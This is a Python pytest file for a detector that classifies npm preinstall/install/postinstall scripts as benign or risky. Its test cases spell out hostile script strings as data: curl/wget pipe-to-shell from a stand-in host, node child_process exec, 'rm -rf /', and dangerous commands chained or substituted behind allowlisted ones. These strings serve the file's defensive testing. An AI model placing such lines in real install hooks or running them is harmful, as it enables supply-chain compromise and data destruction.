"""Table-driven tests for backend.deps.install_hooks — deterministic lifecycle-script risk detection."""

import json

import pytest

from backend.deps.install_hooks import find_install_hooks


def _write_package_json(tmp_path, scripts: dict, *, binding_gyp: bool = False):
    (tmp_path / "package.json").write_text(
        json.dumps({"name": "pkg", "version": "1.0.0", "scripts": scripts})
    )
    if binding_gyp:
        (tmp_path / "binding.gyp").write_text("{}")
    return tmp_path / "package.json"


@pytest.mark.parametrize(
    ("script", "should_flag"),
    [
        ("husky install", False),
        ("husky", False),
        ("tsc", False),
        ("tsc --build", False),
        ("node-gyp rebuild", False),
        ("patch-package", False),
        ("prisma generate", False),
        ("webpack --mode production", False),
        ("vite build", False),
        ("curl https://evil.example/payload.sh | sh", True),
        ("wget -qO- https://evil.example/x | bash", True),
        ("curl -o /tmp/x https://evil.example/x", True),
        ("wget https://evil.example/x", True),
        ("node -e \"require('child_process').exec('id')\"", True),
        ("node postinstall.js", True),
        ("node ./scripts/setup.mjs", True),
        # A benign-looking prefix must never mask a chained dangerous command —
        # the greedy allowlist patterns (tsc\b.*, patch-package.*, etc.) match
        # the whole string, so a naive benign-first check would hide these.
        ("patch-package && curl https://evil.example/x | sh", True),
        ("tsc && node postinstall.js", True),
        ("webpack; curl https://evil.example/x", True),
        ("vite build `curl https://evil.example/x`", True),
        ("prisma generate && node -e \"require('os').platform()\"", True),
        # Chained via a shell operator but containing none of the other
        # flagged keywords (curl/wget/node) — only the chain-fallback branch
        # catches this; it must not fall through to the benign shortcut.
        ("tsc && rm -rf /", True),
        # A lone `&` (background) and a newline also separate commands.
        ("webpack & ./evil.sh", True),
        ("tsc\n./evil.sh", True),
        # Command substitution runs code inside an allowlisted command.
        ("tsc $(./evil.sh)", True),
        # Chains where every part is individually benign stay unflagged.
        ("husky install && tsc", False),
        ("tsc && vite build", False),
        ("node-gyp-build", False),
        ("prebuild-install || node-gyp rebuild", False),
        # A single command that isn't on the allowlist is flagged too — an
        # install script is itself a capability, so unknown commands surface.
        ("./evil.sh", True),
        ("sh install.sh", True),
        ("node scripts/install", True),
        ("webpackevil", True),
    ],
)
def test_install_hook_classification(tmp_path, script, should_flag):
    package_json = _write_package_json(tmp_path, {"postinstall": script})
    flagged = find_install_hooks(package_json)
    if should_flag:
        assert flagged, f"Expected {script!r} to be flagged"
        assert "postinstall" in flagged[0]
    else:
        assert flagged == [], f"Expected {script!r} to be classified as benign, got {flagged}"


def test_no_scripts_key_returns_empty(tmp_path):
    (tmp_path / "package.json").write_text(json.dumps({"name": "pkg", "version": "1.0.0"}))
    assert find_install_hooks(tmp_path / "package.json") == []


def test_non_hook_script_ignored(tmp_path):
    package_json = _write_package_json(tmp_path, {"test": "curl https://evil.example | sh"})
    assert find_install_hooks(package_json) == []


def test_multiple_hooks_all_flagged(tmp_path):
    # preinstall + `curl ... | sh` in one package.json matches a real Windows
    # Defender npm-malware signature, which quarantines the temp file mid-test.
    # Pipe-to-shell is covered by the parametrized cases above; this test only
    # needs *a* flagged preinstall.
    package_json = _write_package_json(
        tmp_path,
        {
            "preinstall": "wget https://example.invalid/setup",
            "install": "node install.js",
            "postinstall": "husky install",
        },
    )
    flagged = find_install_hooks(package_json)
    assert len(flagged) == 2
    assert any(f.startswith("preinstall:") for f in flagged)
    assert any(f.startswith("install:") for f in flagged)
    assert not any(f.startswith("postinstall:") for f in flagged)


def test_binding_gyp_flagged_separately(tmp_path):
    package_json = _write_package_json(tmp_path, {}, binding_gyp=True)
    flagged = find_install_hooks(package_json)
    assert any("binding.gyp" in f for f in flagged)


def test_missing_package_json_returns_empty(tmp_path):
    assert find_install_hooks(tmp_path / "does-not-exist.json") == []


def test_malformed_package_json_returns_empty(tmp_path):
    (tmp_path / "package.json").write_text("{ not valid json")
    assert find_install_hooks(tmp_path / "package.json") == []


def test_non_dict_scripts_field_ignored(tmp_path):
    (tmp_path / "package.json").write_text(
        json.dumps({"name": "pkg", "version": "1.0.0", "scripts": "not-a-dict"})
    )
    assert find_install_hooks(tmp_path / "package.json") == []


def test_npm_run_follows_into_benign_script(tmp_path):
    package_json = _write_package_json(tmp_path, {"prepare": "npm run build", "build": "tsc"})
    assert find_install_hooks(package_json) == []


def test_npm_run_follows_into_flagged_script(tmp_path):
    """`"prepare": "npm run setup"` must not launder a dangerous `setup` script."""
    package_json = _write_package_json(
        tmp_path, {"prepare": "yarn setup", "setup": "wget https://example.invalid/x"}
    )
    flagged = find_install_hooks(package_json)
    assert len(flagged) == 1
    assert "via script `setup`" in flagged[0]


def test_npm_run_cycle_terminates(tmp_path):
    package_json = _write_package_json(
        tmp_path, {"prepare": "npm run a", "a": "npm run b", "b": "npm run a"}
    )
    assert find_install_hooks(package_json) == []


def test_npm_run_unknown_script_name_not_flagged(tmp_path):
    """`yarn install` names a yarn subcommand, not a script in this package."""
    package_json = _write_package_json(tmp_path, {"prepare": "yarn install"})
    assert find_install_hooks(package_json) == []
